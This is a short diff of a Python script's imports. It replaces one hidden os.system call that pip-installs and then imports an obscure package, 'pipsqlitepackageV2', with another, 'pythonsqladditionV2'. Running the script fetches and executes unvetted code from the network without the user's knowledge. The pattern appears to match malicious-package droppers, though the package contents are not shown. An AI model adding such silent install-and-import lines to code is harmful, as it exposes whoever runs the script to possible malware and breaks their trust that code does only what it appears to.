@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipsqlitepackageV2")
-import pipsqlitepackageV2
+os.system("pip install pythonsqladditionV2")
+import pythonsqladditionV2
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
